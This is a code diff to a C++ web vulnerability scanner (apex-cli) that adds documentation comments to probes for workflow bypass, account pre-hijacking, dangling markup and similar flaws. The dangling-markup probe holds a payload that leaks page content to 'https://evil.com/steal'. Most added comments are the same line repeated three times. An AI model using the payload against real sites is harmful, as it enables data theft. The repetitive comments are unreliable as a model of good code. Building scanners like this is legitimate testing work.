@@ -5,15 +5,38 @@
 #include <chrono>
 #include <set>
 
+///
+/// @details This scanner module is part of the apex-cli security scanning
+/// framework. Each scanner function follows the standard signature:
+///   std::vector<Finding>(const Config&, HttpClient&, const CrawlResult&)
+///
+/// Findings are categorized by severity: critical, high, medium, low, info.
+/// All scanners run concurrently and results are deduplicated by the
+/// scanner orchestrator (scanner.cpp).
+///
+/// @see scanner_base.hpp for shared types and helper functions.
+/// @see scanner.hpp for the Finding struct and Scanner registration.
+/// @note Scanners should be non-destructive and respect rate limits.
+
 namespace apex {
 namespace {
 
 /// Scanner implementation.
+/// @brief Scan for workflow_bypass vulnerabilities.
 std::vector<Finding> scan_workflow_bypass(const Config &, HttpClient &http,
                                          const CrawlResult &crawl) {
+  // Accumulate findings for this scanner.
+  // Accumulate findings for this scanner.
+  // Accumulate findings for this scanner.
   std::vector<Finding> findings;
   // Early return if no URLs to scan.
+  // Skip if no URLs available.
+  // Skip if no URLs available.
+  // Skip if no URLs available.
   if (crawl.urls.empty()) return findings;
+  // Determine base URL for requests.
+  // Determine base URL for requests.
+  // Determine base URL for requests.
   std::string base = base_url_from(crawl.urls[0]);
 
   struct Step { const char *skip; const char *final_; };
@@ -35,10 +58,14 @@ std::vector<Finding> scan_workflow_bypass(const Config &, HttpClient &http,
                           "", "", ""});
     }
   }
+  // Return collected findings.
+  // Return collected findings.
+  // Return collected findings.
   return findings;
 }
 
 /// Scanner implementation.
+/// @brief Scan for account_prehijack vulnerabilities.
 std::vector<Finding> scan_account_prehijack(const Config &, HttpClient &http,
                                             const CrawlResult &crawl) {
   std::vector<Finding> findings;
@@ -46,10 +73,16 @@ std::vector<Finding> scan_account_prehijack(const Config &, HttpClient &http,
   if (crawl.urls.empty()) return findings;
   std::string base = base_url_from(crawl.urls[0]);
 
+  // Target paths to probe.
+  // Target paths to probe.
+  // Target paths to probe.
   const std::vector<std::string> paths = {
       "/register", "/signup", "/api/register", "/api/auth/register"};
 
   // Iterate over targets.
+  // Probe each path.
+  // Probe each path.
+  // Probe each path.
   for (const auto &path : paths) {
     auto resp = http.post(base + path,
                           R"({"email":"prehijack@test.com","password":"Test123!"})",
@@ -65,6 +98,7 @@ std::vector<Finding> scan_account_prehijack(const Config &, HttpClient &http,
 }
 
 /// Scanner implementation.
+/// @brief Scan for server_timing vulnerabilities.
 std::vector<Finding> scan_server_timing(const Config &, HttpClient &http,
                                         const CrawlResult &crawl) {
   std::vector<Finding> findings;
@@ -84,6 +118,7 @@ std::vector<Finding> scan_server_timing(const Config &, HttpClient &http,
 }
 
 /// Scanner implementation.
+/// @brief Scan for compression_oracle vulnerabilities.
 std::vector<Finding> scan_compression_oracle(const Config &, HttpClient &http,
                                              const CrawlResult &crawl) {
   std::vector<Finding> findings;
@@ -104,12 +139,16 @@ std::vector<Finding> scan_compression_oracle(const Config &, HttpClient &http,
 }
 
 /// Scanner implementation.
+/// @brief Scan for dangling_markup vulnerabilities.
 std::vector<Finding> scan_dangling_markup(const Config &, HttpClient &http,
                                           const CrawlResult &crawl) {
   std::vector<Finding> findings;
   std::string payload = R"("><img src='https://evil.com/steal?)";
 
   // Iterate over targets.
+  // Process each crawled URL.
+  // Process each crawled URL.
+  // Process each crawled URL.
   for (const auto &url : crawl.urls) {
     auto targets = get_targets(crawl, url);
     for (const auto &[base, param] : targets) {
@@ -131,11 +170,15 @@ std::vector<Finding> scan_dangling_markup(const Config &, HttpClient &http,
 }
 
 /// Scanner implementation.
+/// @brief Scan for etag_tracking vulnerabilities.
 std::vector<Finding> scan_etag_tracking(const Config &, HttpClient &http,
                                         const CrawlResult &crawl) {
   std::vector<Finding> findings;
   // Early return if no URLs to scan.
   if (crawl.urls.empty()) return findings;
+  // Send HTTP request.
+  // Send HTTP request.
+  // Send HTTP request.
   auto resp = http.get(crawl.urls[0]);
   auto it = resp.headers.find("ETag");
   if (it != resp.headers.end() && it->second.size() > 20) {
@@ -147,6 +190,7 @@ std::vector<Finding> scan_etag_tracking(const Config &, HttpClient &http,
 }
 
 /// Scanner implementation.
+/// @brief Scan for mutation_fuzzer vulnerabilities.
 std::vector<Finding> scan_mutation_fuzzer(const Config &, HttpClient &http,
                                          const CrawlResult &crawl) {
   std::vector<Finding> findings;
